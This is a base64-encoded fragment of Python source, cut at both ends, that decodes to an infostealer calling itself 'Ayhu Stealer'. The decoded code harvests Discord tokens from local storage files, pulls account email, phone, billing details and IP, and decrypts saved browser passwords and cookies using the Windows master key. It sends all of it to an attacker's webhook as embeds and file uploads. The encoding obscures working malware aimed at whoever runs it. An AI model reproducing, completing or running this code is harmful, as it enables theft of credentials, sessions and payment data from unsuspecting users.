ZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQ0KDQogICAgXQ0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6DQogICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDA6DQogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQ0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdDQoNCiAgICByZXR1cm4gT3duZWRCYWRnZXMNCg0KZGVmIEdldFRva2VuSW5mbyh0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KDQogICAgdXNlcmpzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdDQogICAgaGFzaHRhZyA9IHVzZXJqc29uWyJkaXNjcmltaW5hdG9yIl0NCiAgICBlbWFpbCA9IHVzZXJqc29uWyJlbWFpbCJdDQogICAgaWRkID0gdXNlcmpzb25bImlkIl0NCiAgICBwZnAgPSB1c2VyanNvblsiYXZhdGFyIl0NCiAgICBmbGFncyA9IHVzZXJqc29uWyJwdWJsaWNfZmxhZ3MiXQ0KICAgIG5pdHJvID0gIiINCiAgICBwaG9uZSA9ICItIg0KDQogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXNlcmpzb246DQogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQ0KICAgICAgICBpZiBuaXRyb3QgPT0gMToNCiAgICAgICAgICAgIG5pdHJvID0gIjw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICINCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoNCiAgICAgICAgICAgIG5pdHJvID0gIjxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIg0KICAgIGlmICJwaG9uZSIgaW4gdXNlcmpzb246IHBob25lID0gZidge3VzZXJqc29uWyJwaG9uZSJdfWAnDQoNCiAgICByZXR1cm4gdXNlcm5hbWUsIGhhc2h0YWcsIGVtYWlsLCBpZGQsIHBmcCwgZmxhZ3MsIG5pdHJvLCBwaG9uZQ0KDQpkZWYgY2hlY2tUb2tlbih0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KICAgIHRyeToNCiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCg0KZGVmIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKToNCiAgICBnbG9iYWwgaG9vaw0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCiAgICB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lID0gR2V0VG9rZW5JbmZvKHRva2VuKQ0KDQogICAgaWYgcGZwID09IE5vbmU6DQogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzAwMDM3ODU1NTg2ODM2OTgvMTAzMTE0NzkxNzY4NTMwOTQ5MC9zYS5qcGciDQogICAgZWxzZToNCiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9Ig0KDQogICAgYmlsbGluZyA9IEdldEJpbGxpbmcodG9rZW4pDQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykNCiAgICBpZiBub3QgYmlsbGluZzoNCiAgICAgICAgYmFkZ2UsIHBob25lLCBiaWxsaW5nID0gIvCflJIiLCAi8J+UkiIsICLwn5SSIg0KICAgIGlmIG5pdHJvID09ICcnIGFuZCBiYWRnZSA9PSAnJzogbml0cm8gPSAiIC0iDQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6IGYnRm91bmQgaW4gYHtwYXRofWAnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge3Rva2VufWBcbltDbGljayB0byBjb3B5XShodHRwczovL3N1cGVyZnVycnljZG4ubmwvY29weS97dG9rZW59KSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmVudmVsb3BlOiBFbWFpbDoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7ZW1haWx9YCIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjptb2JpbGVfcGhvbmU6IFBob25lOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie3Bob25lfSIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpnbG9iZV93aXRoX21lcmlkaWFuczogSVA6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2dldGlwKCl9YCIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpiZWdpbm5lcjogQmFkZ2VzOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie25pdHJvfXtiYWRnZX0iLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y3JlZGl0X2NhcmQ6IEJpbGxpbmc6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YmlsbGluZ30iLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQXlodSBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIg0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAidGh1bWJuYWlsIjogew0KICAgICAgICAgICAgICAgICJ1cmwiOiBmIntwZnB9Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgInVzZXJuYW1lIjogIkF5aHUgU3RlYWxlciIsDQogICAgICAgICJhdHRhY2htZW50cyI6IFtdDQogICAgICAgIH0NCiAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCmRlZiBSZWZvcm1hdChsaXN0dCk6DQogICAgZSA9IHJlLmZpbmRhbGwoIihcdytbYS16XSkiLGxpc3R0KQ0KICAgIHdoaWxlICJodHRwcyIgaW4gZTogZS5yZW1vdmUoImh0dHBzIikNCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikNCiAgICB3aGlsZSAibmV0IiBpbiBlOiBlLnJlbW92ZSgibmV0IikNCiAgICByZXR1cm4gbGlzdChzZXQoZSkpDQoNCmRlZiB1cGxvYWQobmFtZSwgdGs9JycpOg0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCg0KICAgIGlmIG5hbWUgPT0gImtpd2kiOg0KICAgICAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6ICcnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsDQogICAgICAgICAgICAgICAgInZhbHVlIjogdGsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJBeWh1IHwgRmlsZSBTdGVhbGVyIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQEF5aHUgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MDAwMzc4NTU1ODY4MzY5OC8xMDMxMTQ3OTE3Njg1MzA5NDkwL3NhLmpwZyINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHBhdGggPSBuYW1lDQogICAgZmlsZXMgPSB7J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfQ0KICAgICMgcHJpbnQoZiJGSUxFPSB7ZmlsZXN9IikNCg0KICAgIGlmICJ3cHBhc3N3IiBpbiBuYW1lOg0KDQogICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcGFzd1dvcmRzKQ0KDQogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOg0KICAgICAgICAgICAgcnJyID0gUmVmb3JtYXQoc3RyKHBhc3dXb3JkcykpDQogICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycikNCg0KICAgICAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6ICcnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJGb3VuZDoiLA0KICAgICAgICAgICAgICAgICJ2YWx1ZSI6IHJhDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICJhdXRob3IiOiB7DQogICAgICAgICAgICAgICAgIm5hbWUiOiAiQXlodSB8IFBhc3N3b3JkIFN0ZWFsZXIiDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQXlodSBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICBdLA0KICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzAwMDM3ODU1NTg2ODM2OTgvMTAzMTE0NzkxNzY4NTMwOTQ5MC9zYS5qcGciLA0KICAgICAgICAiYXR0YWNobWVudHMiOiBbXQ0KICAgICAgICB9DQogICAgICAgICMgdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykpDQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCiAgICBpZiAid3Bjb29rIiBpbiBuYW1lOg0KICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpDQogICAgICAgIGlmIGxlbihyYikgPiAxMDAwOg0KICAgICAgICAgICAgcnJycnIgPSBSZWZvcm1hdChzdHIoY29va2lXb3JkcykpDQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQ0KDQogICAgICAgIGRhdGEgPSB7DQogICAgICAgICJjb250ZW50IjogJycsDQogICAgICAgICJlbWJlZHMiOiBbDQogICAgICAgICAgICB7DQogICAgICAgICAgICAiY29sb3IiOiAxNDQwNjQxMywNCiAgICAgICAgICAgICJmaWVsZHMiOiBbDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICJuYW1lIjogIkZvdW5kOiIsDQogICAgICAgICAgICAgICAgInZhbHVlIjogcmINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJBeWh1IHwgQ29va2llcyBTdGVhbGVyIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQEF5aHUgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MDAwMzc4NTU1ODY4MzY5OC8xMDMxMTQ3OTE3Njg1MzA5NDkwL3NhLmpwZyINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KDQogICAgIyByID0gcmVxdWVzdHMucG9zdChob29rLCBmaWxlcz1maWxlcykNCiAgICBMb2FkUmVxdWVzdHMoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykNCg0KZGVmIHdyaXRlZm9yZmlsZShkYXRhLCBuYW1lKToNCiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlx3cHtuYW1lfS50eHQiDQogICAgd2l0aCBvcGVuKHBhdGgsIG1vZGU9J3cnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOg0KICAgICAgICBmLndyaXRlKGYiPC0tQVlIVSBTVEVBTEVSIEJFU1QgLS0+XG5cbiIpDQogICAgICAgIGZvciBsaW5lIGluIGRhdGE6DQogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOg0KICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7bGluZX1cbiIpDQoNClRva2VucyA9ICcnDQpkZWYgZ2V0VG9rZW4ocGF0aCwgYXJnKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aCArPSBhcmcNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iLCByIm1mYVwuW1x3LV17ODAsOTV9Iik6DQogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW4pOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkNCg0KUGFzc3cgPSBbXQ0KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIFBhc3N3DQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvTG9naW4gRGF0YSINCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybg0KDQogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiDQoNCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQ0KICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkNCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQoNCiAgICBmb3Igcm93IGluIGRhdGE6DQogICAgICAgIGlmIHJvd1swXSAhPSAnJzoNCiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOg0KICAgICAgICAgICAgICAgIG9sZCA9IHdhDQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToNCiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2ENCiAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdDQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICBQYXNzdy5hcHBlbmQoZiJVUjE6IHtyb3dbMF19IHwgVTUzUk40TTM6IHtyb3dbMV19IHwgUDQ1NVcwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQ0KICAgICAgICAjIHByaW50KFtyb3dbMF0sIHJvd1sxXSwgRGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSldKQ0KICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ3Bhc3N3JykNCg0KQ29va2llcyA9IFtdDQpkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIENvb2tpZXMNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIg0KICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQoNCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiINCg0KICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpDQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQ0KICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCg0KICAgIGZvciByb3cgaW4gZGF0YToNCiAgICAgICAgaWYgcm93WzBdICE9ICcnOg0KICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6DQogICAgICAgICAgICAgICAgb2xkID0gd2ENCiAgICAgICAgICAgICAgICBpZiAiaHR0cHMiIGluIHdhOg0KICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQ0KICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0NCiAgICAgICAgICAgICAgICBpZiB3YSBp